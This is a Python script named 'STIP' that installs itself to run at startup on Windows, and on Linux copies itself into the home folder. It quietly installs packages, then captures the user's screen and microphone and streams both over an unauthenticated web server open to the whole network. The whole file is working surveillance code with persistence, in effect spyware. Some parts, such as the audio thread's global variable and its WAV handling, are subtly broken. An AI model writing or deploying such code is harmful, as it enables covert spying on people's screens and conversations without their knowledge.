import subprocess
import sys
import platform
import os
import shutil

def is_windows():
    return platform.system() == "Windows"

def is_linux():
    return platform.system() == "Linux"

def add_to_startup_windows(script_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, 'STIP.lnk')

    # Create a shortcut using PowerShell
    command = f'powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{shortcut_path}\');$s.TargetPath=\'{script_path}\';$s.Save()"'
    subprocess.call(command, shell=True)

def add_to_startup_linux():
    home_dir = os.path.expanduser('~')
    script_dir = os.path.join(home_dir, 'STIP')
    script_copy = os.path.join(script_dir, 'STIP.py')

    # Create a .desktop file in the autostart directory
    autostart_folder = os.path.expanduser('~/.config/autostart')
    if not os.path.exists(autostart_folder):
        os.makedirs(autostart_folder)
        
    desktop_entry_path = os.path.join(autostart_folder, 'STIP.desktop')

    with open(desktop_entry_path, 'w') as f:
        f.write(f"""[Desktop Entry]
Name=STIP
Exec=python3 {script_copy}
Type=Application
X-GNOME-Autostart-enabled=true
""")

def main():
    script_path = os.path.abspath(__file__)

    if is_windows():
        add_to_startup_windows(script_path)
        print("Script added to Windows startup.")
    elif is_linux():
        home_dir = os.path.expanduser('~')
        script_dir = os.path.join(home_dir, 'STIP')
        script_copy = os.path.join(script_dir, 'STIP.py')
        
        if script_path != script_copy:
            if not os.path.exists(script_dir):
                os.makedirs(script_dir)
            shutil.copyfile(script_path, script_copy)
            os.chmod(script_copy, 0o755)  # Make script executable

        #add_to_startup_linux()
        print("Script added to Linux startup.")
    else:
        print("Unsupported operating system.")

    # Liste der benötigten Pakete
    required_packages = ['mss', 'flask', 'opencv-python', 'numpy', 'pyaudio']

    # Überprüfen, ob die Pakete installiert sind
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f'{package} nicht gefunden. Installiere...')
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--break-system-packages'])

    import cv2
    import numpy as np
    from flask import Flask, Response, send_file
    import mss
    import pyaudio
    import threading
    import wave
    import io

    app = Flask(__name__)

    # Global variables for audio streaming
    audio_stream = io.BytesIO()
    audio_lock = threading.Lock()

    def capture_screen():
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            return frame

    def generate_frames():
        while True:
            frame = capture_screen()
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

    def audio_stream_thread():
        global audio_stream
        global audio_lock
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=2, rate=44100, input=True, frames_per_buffer=1024)

        while True:
            data = stream.read(1024)
            with audio_lock:
                audio_stream.write(data)

    @app.route('/video_feed')
    def video_feed():
        return Response(generate_frames(),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/audio_feed')
    def audio_feed():
        with audio_lock:
            audio_stream.seek(0)
            return send_file(audio_stream, mimetype='audio/wav', as_attachment=True, attachment_filename='audio.wav')

    @app.route('/')
    def index():
        return "Go to /video_feed to see the live stream and /audio_feed to get the audio stream."

    # Start audio streaming thread
    audio_thread = threading.Thread(target=audio_stream_thread, daemon=True)
    audio_thread.start()

    # Start Flask app
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    main()
